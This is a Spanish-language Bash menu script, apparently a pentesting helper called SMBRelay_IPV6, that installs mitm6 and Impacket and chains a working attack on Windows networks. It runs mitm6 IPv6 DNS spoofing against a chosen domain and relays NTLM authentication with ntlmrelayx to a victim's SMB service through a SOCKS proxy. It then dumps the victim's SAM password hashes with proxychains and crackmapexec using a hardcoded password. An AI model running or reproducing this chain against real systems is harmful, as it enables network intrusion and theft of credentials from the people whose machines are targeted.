#!/bin/bash

opcion="ninguna"


function opcion1
{

# instalacion de mitm6

sudo apt install python3-pip
git clone https://github.com/fox-it/mitm6.git
cd mitm6
pip3 install -r requirements.txt
pip3 install mitm6
python3 setup.py install
cd ..

   read
   return 0
}


function opcion2
{

# instalacion de impacket

git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -r requirements.txt
python3 setup.py install

   read
   return 0

}

function opcion3
{

# Ejecucion de Mitm6

echo ""
echo "*								*"
echo "*	Ingrese el dominio - Ejemplo: corp.local		*"
echo "*								*"
echo ""
read dominio

gnome-terminal -e "mitm6 -d $dominio.local" &

   read
   return 0

}

function opcion4
{

echo ""
echo "*                                                         *"
echo "* Ingrese la ip de la victima - Ejemplo: 192.168.1.10                *"
echo "*                                                         *"
echo ""
read victima

echo ""
echo "*                                                         *"
echo "* Ingrese la ip del atacante - Ejemplo: 192.168.1.20                *"
echo "*                                                         *"
echo ""
read atacante

cd impacket/examples
gnome-terminal -e "ntlmrelayx.py -6 -wh $atacante -t smb://$victima -socks -debug -smb2support" &

   read
   return 0

}

function opcion5
{

echo ""
echo "*                                                         *"
echo "* Ingrese la ip de la victima - Ejemplo: 192.168.1.10                *"
echo "*                                                         *"
echo ""
read victima

echo ""
echo "*                                                         *"
echo "* Ingrese el nombre de usuario - Ejemplo: Administrador                *"
echo "*                                                         *"
echo ""
read usuario

echo ""
echo "*                                                         *"
echo "* Ingrese el nombre del dominio - Ejemplo: corp.local                *"
echo "*                                                         *"
echo ""
read dominio

proxychains crackmapexec smb $victima -u $usuario -p H4ch3d! -d $dominio --sam 2>/dev/null

   read
   return 0

}

while [ $opcion != "6"  ]
    do

echo "                                                                                         	"
echo "	 _______  __   __  _______    ______    _______  ___      _______  __   __    ___   _______  __   __  _______  ___   __   __ 	"
echo "	|       ||  |_|  ||  _    |  |    _ |  |       ||   |    |   _   ||  | |  |  |   | |       ||  | |  ||       ||   | |  |_|  |	"
echo "	|  _____||       || |_|   |  |   | ||  |    ___||   |    |  |_|  ||  |_|  |  |   | |    _  ||  |_|  ||  _____||   | |       |	"
echo "	| |_____ |       ||       |  |   |_||_ |   |___ |   |    |       ||       |  |   | |   |_| ||       || |_____ |   | |       |	"
echo "	|_____  ||       ||  _   |   |    __  ||    ___||   |___ |       ||_     _|  |   | |    ___||       ||_____  ||   |  |     | 	"
echo "	 _____| || ||_|| || |_|   |  |   |  | ||   |___ |       ||   _   |  |   |    |   | |   |     |     |  _____| ||   | |   _   |	"
echo "	|_______||_|   |_||_______|  |___|  |_||_______||_______||__| |__|  |___|    |___| |___|      |___|  |_______||___| |__| |__|	"
echo "												"

echo "                                                                                          "
echo "                                                                                          "
echo "                              				[Created By Anonimo501]                 "
echo "                        			  [https://youtube.com/c/Anonimo501]            "
echo "                         				https://t.me/Pen7esting                 "
echo "												"
echo "                     			   	   Hola bienvenid@s a SMBRelay_IPV6             "
echo "                                                                                          "


	echo -e "\nMenu"
	echo -e "\t1) Instalar Mitm6"
	echo -e "\t2) Instalar Impacket"
	echo -e "\t3) Ejecutar Mitm6"
	echo -e "\t4) Ejecutar Impacket"
	echo -e "\t5) Proxychain + Crackmapexec"
	echo -e "\t6) Salir\n"
	echo -e "\tOpcion: \c"

	read opcion

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
		"3" )
		      opcion3
		      ;;
		"4" )
               opcion4
  		      ;;
		"5" )
               opcion5
  		      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
